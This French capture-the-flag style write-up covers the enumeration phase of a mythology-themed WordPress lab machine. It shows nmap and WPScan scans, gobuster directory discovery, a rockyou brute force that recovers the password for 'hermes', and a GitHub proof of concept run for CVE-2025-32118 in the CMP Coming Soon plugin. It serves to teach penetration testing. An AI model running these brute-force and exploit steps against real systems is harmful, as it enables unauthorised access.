# Énumération

## 🔍 Phase 1 : Reconnaissance Initiale

### Énumération Réseau

Commençons par découvrir les machines présentes sur le réseau cible.

```bash
# Scan de découverte du réseau
nmap -sn 192.168.56.1/24

# Résultat
Starting Nmap 7.93 ( https://nmap.org ) at 2025-07-06 23:27 CEST
Nmap scan report for 192.168.56.10
Host is up (0.00014s latency).
MAC Address: 08:00:27:58:FA:50 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.11
Host is up (0.00011s latency).
MAC Address: 08:00:27:BE:5F:A9 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.12
Host is up (0.00018s latency).
MAC Address: 08:00:27:95:2A:F9 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.100
Host is up (0.000040s latency).
MAC Address: 08:00:27:30:D7:D4 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.1
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 12.95 seconds
```

!!! success "Découverte"
    Trois machines sont visibles sur le réseau :  
    - **192.168.56.10**  
    - **192.168.56.11**
    - **192.168.56.12**

### Scan Complet de la Machine en .10

```bash
# Scan complet avec détection de services
nmap -sC -sV -p- 192.168.56.10

# Résultat
Nmap scan report for pantheon.god (192.168.56.10)
Host is up (0.0011s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 6.8.1
| http-robots.txt: 1 disallowed entry
|_/wp-admin/
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Pantheon
```

!!! info "Services Découverts"
    - **Port 22** : SSH (OpenSSH 7.6p1)
    - **Port 80** : HTTP (Apache 2.4.29 + WordPress 6.8.1)

## 🌐 Énumération Web

### Accès au Site Web

En accédant au port 80, nous sommes redirigés vers `pantheon.god`. Le site utilise WordPress 6.8.1.

### Énumération WordPress avec WPScan

```bash
# Scan agressif des plugins
wpscan --url "http://192.168.56.10/" --plugins-detection aggressive
```
<details>
<summary><strong>📋 Voir le scan WPScan complet</strong></summary>

```bash
wpscan --url "http://pantheon.god/" --plugins-detection aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://pantheon.god/ [192.168.56.10]
[+] Started: Tue May 27 02:01:37 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://pantheon.god/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://pantheon.god/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://pantheon.god/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://pantheon.god/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://pantheon.god/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.8.1 identified (Latest, released on 2025-04-30).
 | Found By: Rss Generator (Passive Detection)
 |  - http://pantheon.god/feed/, <generator>https://wordpress.org/?v=6.8.1</generator>
 |  - http://pantheon.god/comments/feed/, <generator>https://wordpress.org/?v=6.8.1</generator>

[+] WordPress theme in use: twentytwentyfive
 | Location: http://pantheon.god/wp-content/themes/twentytwentyfive/
 | Latest Version: 1.2 (up to date)
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://pantheon.god/wp-content/themes/twentytwentyfive/readme.txt
 | [!] Directory listing is enabled
 | Style URL: http://pantheon.god/wp-content/themes/twentytwentyfive/style.css?ver=1.2
 | Style Name: Twenty Twenty-Five
 | Style URI: https://wordpress.org/themes/twentytwentyfive/
 | Description: Twenty Twenty-Five emphasizes simplicity and adaptability. It offers flexible design options, suppor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://pantheon.god/wp-content/themes/twentytwentyfive/style.css?ver=1.2, Match: 'Version: 1.2'

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:04:30 <=======================================
 Checking Known Locations - Time: 00:22:44 <========================> (110793 / 110793) 100.00% Time: 00:22:44
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://pantheon.god/wp-content/plugins/akismet/
 | Latest Version: 5.4
 | Last Updated: 2025-05-07T16:30:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://pantheon.god/wp-content/plugins/akismet/, status: 403
 |
 | The version could not be determined.

[+] cmp-coming-soon-maintenance
 | Location: http://pantheon.god/wp-content/plugins/cmp-coming-soon-maintenance/
 | Last Updated: 2025-04-30T08:07:00.000Z
 | Readme: http://pantheon.god/wp-content/plugins/cmp-coming-soon-maintenance/readme.txt
 | [!] The version is out of date, the latest version is 4.1.15
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://pantheon.god/wp-content/plugins/cmp-coming-soon-maintenance/, status: 200
 |
 | Version: 4.1.13 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://pantheon.god/wp-content/plugins/cmp-coming-soon-maintenance/readme.txt

[+] feed
 | Location: http://pantheon.god/wp-content/plugins/feed/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://pantheon.god/wp-content/plugins/feed/, status: 200
 |
 | The version could not be determined.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:01 <===============================> (137 / 137) 100.00% Time: 00:00:01

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue May 27 02:24:34 2025
[+] Requests Done: 110950
[+] Cached Requests: 44
[+] Data Sent: 29.306 MB
[+] Data Received: 33.036 MB
[+] Memory used: 594.039 MB
[+] Elapsed time: 00:22:56
```

</details>

#### Résultats Importants

!!! warning "Vulnérabilités Découvertes"
    - **Plugin CMP Coming Soon** : Version 4.1.13 (obsolète, dernière version 4.1.15)
    - **Directory listing** activé sur `/wp-content/uploads/`
    - **XML-RPC** activé
    - **WP-Cron** activé

#### Détails du Plugin Vulnérable

```bash
[+] cmp-coming-soon-maintenance
 | Location: http://pantheon.god/wp-content/plugins/cmp-coming-soon-maintenance/
 | Last Updated: 2025-04-30T08:07:00.000Z
 | Readme: http://pantheon.god/wp-content/plugins/cmp-coming-soon-maintenance/readme.txt
 | [!] The version is out of date, the latest version is 4.1.15
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 | - http://pantheon.god/wp-content/plugins/cmp-coming-soon-maintenance/, status: 200
 |
 | Version: 4.1.13 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 | - http://pantheon.god/wp-content/plugins/cmp-coming-soon-maintenance/readme.txt
```

### Énumération de Répertoires

```bash
# Énumération des répertoires avec gobuster
gobuster dir -w /opt/lists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -u http://olympe.god/wp-content \
  -x txt,html,php
```

#### Découverte Critique

!!! success "Fichier Important Trouvé"
    ```
    /notes.txt            (Status: 200) [Size: 391]
    ```

### Analyse du Fichier Notes.txt

```bash
# Contenu du fichier notes.txt
curl http://olympe.god/wp-content/notes.txt
```

!!! tip "Indice Important"
    Le fichier contient une note indiquant que tous les dieux devaient changer leurs mots de passe et mettre un `y`, mais seul Hermès ne l'a pas fait.

## 🔐 Recherche de Credentials

### Brute Force sur WordPress

Basé sur l'indice trouvé, nous tentons un brute force sur l'utilisateur `hermes` :

```bash
# Brute force avec rockyou.txt
wpscan --url http://192.168.56.10 \
  --usernames hermes \
  --passwords /usr/share/wordlists/rockyou.txt
```

!!! success "Credentials Trouvés"
    - **Utilisateur** : hermes
    - **Mot de passe** : ilovegod

## 🎯 Analyse de la Vulnérabilité CMP Coming Soon

### Recherche de POC

La version 4.1.13 du plugin CMP Coming Soon est vulnérable. Nous trouvons un POC sur GitHub :

```bash
# Téléchargement du POC
git clone https://github.com/Nxploited/CVE-2025-32118
cd CVE-2025-32118
```

### Vérification de la Vulnérabilité

```bash
# Test du POC
python3 CVE-2025-32118.py -u http://olympe.god/wordpress -un hermes -p ilovegod
```

!!! warning "Vulnérabilité Confirmée"
    Le plugin permet un bypass d'authentification et l'upload de fichiers malveillants.

## 📊 Résumé de l'Énumération

### Points d'Entrée Identifiés

| Service | Vulnérabilité | Vecteur d'Attaque |
|---------|---------------|-------------------|
| **WordPress** | Plugin CMP Coming Soon 4.1.13 | Authentification bypass |
| **SSH** | Credentials faibles | Brute force possible |
| **Apache** | Directory listing | Information disclosure |

### Credentials Découverts

| Utilisateur | Mot de Passe | Source |
|-------------|--------------|--------|
| **hermes** | ilovegod | Brute force WordPress |

### Fichiers Sensibles

- `/wp-content/notes.txt` : Indices sur les credentials
- `/wp-content/uploads/` : Directory listing activé
- `/wp-content/plugins/cmp-coming-soon-maintenance/` : Plugin vulnérable

## 🎭 Contexte Mythologique

### Hermès - Le Messager Vulnérable

Dans la mythologie grecque, Hermès est le messager des dieux, rapide et rusé. Dans notre lab :

- **Vulnérabilité** : Credentials faibles (hermes:y → hermes:ilovegod)
- **Rôle** : Point d'entrée vers l'Olympe numérique
- **Scénario** : Intercepter les messages divins pour accéder au royaume

### Indices Thématiques

Le fichier `notes.txt` fait référence à un décret de Zeus demandant aux dieux de changer leurs mots de passe, créant un contexte narratif cohérent avec la thématique mythologique.

## 🚀 Prochaines Étapes

Avec ces informations, nous pouvons maintenant :

1. **Exploiter la vulnérabilité CMP Coming Soon**
2. **Obtenir un shell sur la machine**
3. **Élever nos privilèges vers l'utilisateur hermes**
4. **Explorer l'environnement pour d'autres vecteurs**

---

*L'énumération révèle les premières failles dans la défense de l'Olympe. Hermès, le messager divin, a laissé ses secrets exposés...* ⚡ 
